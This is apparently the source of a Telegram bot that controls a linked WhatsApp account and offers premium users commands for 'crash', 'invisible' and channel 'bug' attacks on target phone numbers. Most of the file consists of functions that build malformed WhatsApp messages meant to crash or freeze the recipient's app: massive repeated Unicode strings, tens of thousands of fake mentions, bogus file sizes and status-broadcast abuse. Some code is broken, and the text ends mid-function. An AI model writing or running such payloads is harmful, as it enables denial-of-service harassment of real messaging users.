const { Telegraf, Markup, session } = require("telegraf");
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN } = require("./HdsConfig");
const {
    loadTokensFromGitHub,
    loadResellersFromGitHub,
    checkReseller,
    checkToken,
    addToken,
    addReseller,
    allowedTokens,
    resellers,
    initializeOctokit,
    verifyBotToken
} = require("./HdsDB");
const crypto = require('crypto');
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

let client = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = [
    "https://files.catbox.moe/ger6hy.png",
    "https://files.catbox.moe/90sk08.png"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const startSesi = async () => {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Succes Connected',
        }),
    };

    client = makeWASocket(connectionOptions);
    if (usePairingCode && !client.authState.creds.registered) {
        console.clear();
        let phoneNumber = await question(chalk.bold.white(`\nMasukan nomor sender!\n\nGunakan WhatsApp Ori/beta\nJangan menggunakan WhatsApp Bussines\n`));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        const code = await client.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(chalk.bold.white(`KODE PAIRING ANDA `), chalk.bold.yellow(formattedCode));
    }

    client.ev.on('creds.update', saveCreds);
    store.bind(client.ev);

    client.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.bold.white('Connected!'));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("⛔ Anda bukan owner.");
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan pengguna premium.");
    }
    next();
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApp belum terhubung. Silakan hubungkan dengan Pairing Code terlebih dahulu.");
    return;
  }
  next();
};

bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }

    const RandomBgtJir = getRandomImage();
    const waktuRunPanel = getUptime();

    await ctx.replyWithPhoto(RandomBgtJir, {
        caption: `
\`\`\`HEFAISTOS-HADES\n┏━━❰ INFORMATION (❗) 
╿太 Developer: Cosmo
╽太 Version: 2.0
╽太 Runtime: ${waktuRunPanel}
┕━━━━━━━━━━━━━━━━━
┏━━❰ INVISIBLE (👀) 
╿太 /delayxui 62xxxx
╽太 /casper 62xxxx
╿太 /invisiblev2 62xxxx
┕━━━━━━━━━━━━━━━━━
┏━━❰ BUG CHANNEL (🕊) 
╿太 /crashch <id ch>
╽太 /vincere <id ch>
┕━━━━━━━━━━━━━━━━━
┏━━❰ CRASH NO INVIS (😈) 
╿太 /systemui 62xxxx
╽太 /crashdelay 62xxxx
╿太 /nebula 62xxxx
┕━━━━━━━━━━━━━━━━━
┏━━❰ CONTROLLER (⚙️) 
╿太 /addprem 
╽太 /delprem
┕━━━━━━━━━━━━━━━━━
┏━━❰ THANKS TO (🎌) 
╿太 Cosmo
╽太 Wolf
╿太 Henn
╽太 Xatanical
╿太 Farhost
╽太 Derezyreal
╿太 Kyy Asasin
╽太 Marczz
╿太 Deafort
╿太 Bloodskill
╿太 LeaaWanna
╽太 All Hefaistos Hades team
┕━━━━━━━━━━━━━━━━━\`\`\``,
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.url('OWNER (🚷)', 'https://t.me/raysofhopee')]
        ])
    });
});

//FUNCTION KNTL
async function payoutzep(bijipler) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "COSMO 🚷"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
    }
  }, { userJid: target });

  await client.relayMessage(bijipler, msg.message, {
    messageId: msg.key.id 
  });
}

async function buttoncast(bijipler) {
  const buttons = [];

  for (let i = 0; i < 1000; i++) {
    buttons.push({
      name: `order_${i + 1}`,
      buttonParamsJson: {
        reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
        order: {
          status: "completed",
          order_type: "ORDER"
        },
        share_payment_status: true
      }
    });
  }

  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: buttons,
        messageParamsJson: {
          title: "(🚷) CAST ( COSMO )",
          body: "COSMO (#) 🚷"
        }
      }
    }
  }, { userJid: bijipler });

  await client.relayMessage(bijipler, msg.message, {
    messageId: msg.key.id 
  });
}

async function UIXFC(bijipler) {
    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [bijipler],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: bijipler
                        },
                    },
                    body: {
                        text: "𑲭𑲭𑆻YATIMMM YATIMMM KAMPANG" + "ꦽ".repeat(45000),
                    },
                    nativeFlowMessage: {
                        buttons: [{
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                        ],
                    },
                },
            },
        },
    };

    await client.relayMessage(bijipler, message, {
        participant: {
            jid: bijipler
        },
    });
  console.log(chalk.red("UIXFC SUCCES SENDED"));    
}

//[func bug]
async function LalaDoct(bijipler) {
                   await client.relayMessage(bijipler, {
                           groupMentionedMessage: {
                                   message: {
                                           interactiveMessage: {
                                                   header: {
                                                           documentMessage: {
                                                                   url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                                                   mimetype: "application/pdf",
                                                                   fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                                                   fileLength: "1099511627776",
                                                                   pageCount: 199183729199991,
                                                                   mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                                                   fileName: "Open VCS",
                                                                   fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                                                   directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                                                   mediaKeyTimestamp: "1728631701",
                                                                   contactVcard: true
                                                           },
                                                           hasMediaAttachment: true
                                                   },
                                                   body: {
                                                           text: "\u0000" + "ꦿꦸ".repeat(50000) + "@1".repeat(70000),
                                                   },
                                                   nativeFlowMessage: {
                                                           messageParamsJson: "Open VCS",
                                                           "buttons": [{
                                                                   "name": "review_and_pay",
                                                                   "buttonParamsJson": "{\"currency\":\"IDR\",\"total_amount\":{\"value\":2000000,\"offset\":100},\"reference_id\":\"4R0F79457Q7\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-8e93f147-12f5-45fa-b903-6fa5777bd7de\",\"name\":\"sksksksksksksks\",\"amount\":{\"value\":2000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"sksksksksksksks\",\"native_payment_methods\":[],\"share_payment_status\":false}"
                                                           }]
                                                   },
                                                   contextInfo: {
                                                           mentionedJid: Array.from({
                                                                   length: 5
                                                           }, () => "120363404154098043@newsletter"),
                                                           groupMentions: [{
                                                                   groupJid: "120363404154098043@newsletter",
                                                                   groupSubject: "Open VCS"
                                                           }]
                                                   }
                                           }
                                   }
                           }
                   }, {
                           participant: {
                                   jid: bijipler
                           }
                   });
                   console.log("Send Bug By Hades");
           }

async function LalaAttack(bijipler) {
    let msg = await generateWAMessageFromContent(bijipler, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "𝐂𝐨𝐬𝐦𝐨 𝐢𝐬 𝐁𝐚𝐜𝐤!!!...\n",
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "Aku Kembali Hehe!!!",
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: "Jangan Bacot Cil..."
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "ᵖᵃˢᵘᵏᵃⁿ ᵃⁿᵗᶦ ᵍᶦᵐᵐᶦᶜᵏ"
                            }
                        ]
                    }
                }
            }
        }
    }, {});

    await client.relayMessage(bijipler, msg.message, { participant: { jid: bijipler } }, { messageId: null });
}

async function LalaCrash(bijipler) {
    let msg = await generateWAMessageFromContent(bijipler, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "𝐂𝐨𝐬𝐦𝐨 𝐢𝐬 𝐁𝐚𝐜𝐤!!!\n",
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "Shut Up Your Mouth",
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: "Licked Hades"
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "I Hate A Bocil"
                            }
                        ]
                    }
                }
            }
        }
    }, {});

    await client.relayMessage(bijipler, msg.message, { participant: { jid: bijipler } }, { messageId: null });
}

async function VampPrivateBlank(bijipler) {
  const Vampire = `_*~@2~*_\n`.repeat(10500);
  const Private = 'ꦽ'.repeat(5000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Pembasmi Kontol",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: 'Hades.com!' + Vampire + Private,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Lalapo Bot",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await client.relayMessage(bijipler, message, { participant: { jid: bijipler } });
}

async function Hadesold(bijipler) {
try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [bijipler],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: bijipler,
              },
            },
            body: {
              text: "𝚈𝙾𝚄𝚁 𝚂𝙾𝚄𝙻 𝙸𝚂 𝙼𝙸𝙽𝙴 @𝚛𝚊𝚢𝚜𝚘𝚏𝚑𝚘𝚙𝚎𝚎",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await client.relayMessage(bijipler, message, {
      participant: { jid: bijipler },
    });
  } catch (err) {
    console.log(err);
  }
}

async function protocolbug(bijipler, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "@raysofhopee",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: bijipler,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( # )"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};

const msg = generateWAMessageFromContent(bijipler, MSG, {});

await client.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [bijipler],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: bijipler },
content: undefined
}
]
}
]
}
]
});

if (mention) {
await client.relayMessage(
bijipler,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "🌀 COSMO - TRASH 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" },
content: undefined
}
]
}
);
}
}

async function btnStatus(bijipler, mention) {
let pesan = await generateWAMessageFromContent(bijipler, {
buttonsMessage: {
text: "🔥",
contentText: "༿༑ᜳ𝙃𝙀𝙁𝘼𝙄𝙎𝙏𝙊𝙎 𝙃𝘼𝘿𝙀𝙎ᢶ⃟",
footerText: "Cosmo-Lala",
buttons: [
{ buttonId: ".glitch", buttonText: { displayText: "⚡" + "\u0000".repeat(400000) }, type: 1 }
],
headerType: 1
}
}, {});

await client.relayMessage("status@broadcast", pesan.message, {
messageId: pesan.key.id,
statusJidList: [bijipler],
additionalNodes: [
{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: bijipler }, content: undefined }] }] }
]
});

if (mention) {
await client.relayMessage(bijipler, {
statusMentionMessage: {
message: { protocolMessage: { key: pesan.key, type: 25 } }
}
}, {
additionalNodes: [
{ tag: "meta", attrs: { is_status_mention: "⚡ 𝙃𝙀𝙁𝘼𝙄𝙎𝙏𝙊𝙎 𝙃𝘼𝘿𝙀𝙎" }, content: undefined }
]
});
}
}

async function NewIos(bijipler) {
cient.relayMessage(
bijipler,
{
extendedTextMessage: {
text: `𑲭𑲭HADESSSSSSSSS IS HERE👿 ${'ꦾ'.repeat(90000000)} ${'@13135550002'.repeat(89000)}`,
contextInfo: {
mentionedJid: [
"13135550002@s.whatsapp.net",
...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
],
stanzaId: "1234567890ABCDEF",
participant: "13135550002@s.whatsapp.net",
quotedMessage: {
callLogMesssage: {
isVideo: true,
callOutcome: "1",
durationSecs: "0",
callType: "REGULAR",
participants: [
{
jid: "13135550002@s.whatsapp.net",
callOutcome: "1"
}
]
}
},
remoteJid: "13135550002@s.whastapp.net",
conversionSource: "source_example",
conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
conversionDelaySeconds: 10,
forwardingScore: 99999999,
isForwarded: true,
quotedAd: {
advertiserName: "Example Advertiser",
mediaType: "IMAGE",
jpegThumbnail: Xxx,
caption: "This is an ad caption"
},
placeholderKey: {
remoteJid: "13135550002@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: 86400,
ephemeralSettingTimestamp: "1728090592378",
ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
externalAdReply: {
title: "𝕐𝕆𝕌ℝ 𝔹ℝ𝕆𝕎𝕊𝔼ℝ😰",
body: `Ai To Crash ${'\0'.repeat(200)}`,
mediaType: "VIDEO",
renderLargerThumbnail: true,
previewType: "VIDEO",
thumbnail: Xxx,
sourceType: "x",
sourceId: "x",
sourceUrl: "https://www.facebook.com/WhastApp",
mediaUrl: "https://www.facebook.com/WhastApp",
containsAutoReply: true,
showAdAttribution: true,
ctwaClid: "ctwa_clid_example",
ref: "ref_example"
},
entryPointConversionSource: "entry_point_source_example",
entryPointConversionApp: "entry_point_app_example",
entryPointConversionDelaySeconds: 5,
disappearingMode: {},
actionLink: {
url: "https://www.facebook.com/WhatsApp"
},
groupSubject: "Example Group Subject",
parentGroupJid: "13135550002@g.us",
trustBannerType: "trust_banner_example",
trustBannerAction: 1,
isSampled: false,
utm: {
utmSource: "utm_source_example",
utmCampaign: "utm_campaign_example"
},
forwardedNewsletterMessageInfo: {
newsletterJid: "13135550002@newsletter",
serverMessageId: 1,
newsletterName: "Meta Ai",
contentType: "UPDATE",
accessibilityText: "Meta Ai"
},
businessMessageForwardInfo: {
businessOwnerJid: "13135550002@s.whatsapp.net"
},
smbriyuCampaignId: "smb_riyu_campaign_id_example",
smbServerCampaignId: "smb_server_campaign_id_example",
dataSharingContext: {
showMmDisclosure: true
}
}
}
},
bijipler
? {
  participant: {
  jid: bijipler
  }
  }
: {}
   
);
console.log("Success! Force Ios Sent")
}

async function killui(bijipler, Ptcp = true) {
      await client.relayMessage(
        bijipler,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: 'https://files.catbox.moe/mgnwmg.jpg',
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⿻\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: [bijipler, "6289526156543@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: bijipler,
              },
            }
          : {}
      );
    }

async function LalaCrashIos(bijipler) {
                   try {
                           const IphoneCrash = "𑇂𑆵𑆴𑆿".repeat(60000);
                           await client.relayMessage(bijipler, {
                                   locationMessage: {
                                           degreesLatitude: 11.11,
                                           degreesLongitude: -11.11,
                                           name: "Aku Mau iPhone          " + IphoneCrash,
                                           url: "https://youtube.com/@iqbhalkeifer25"
                                   }
                           }, {
                                   participant: {
                                           jid: bijipler
                                   }
                           });
                           console.log("Send Bug By Hades");
                   } catch (error) {
                           console.error("Error Sending Bug:", error);
                   }
           }

async function NoIos(bijipler) {
  await client.relayMessage(
    bijipler,
    {
      paymentInviteMessage: {
        serviceType: "UPI",
        serviceType: "FBPAY",
        serviceType: "yarn_info",
        serviceType: "PENDING",
        expiryTimestamp: Date.now() + 1814400000,
      },
    },
    {
      participant: {
        jid: bijipler,
      },
    }
  );
}    

async function VampDelayCrash(bijipler) {
    const Vampire = "_*~@15056662003~*_\n".repeat(10200);
    const Lalapo = "ꦽ".repeat(1500);

    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "𝐀𝐧𝐚𝐤 𝐇𝐚𝐬𝐢𝐥 𝐋𝐨𝐧𝐭𝐞",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Lalapo.Clouds" + Lalapo + Vampire
                    },
                    contextInfo: {
                        mentionedJid: [bijipler, "15056662003@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                        forwardingScore: 999,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "https://xnxxx.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

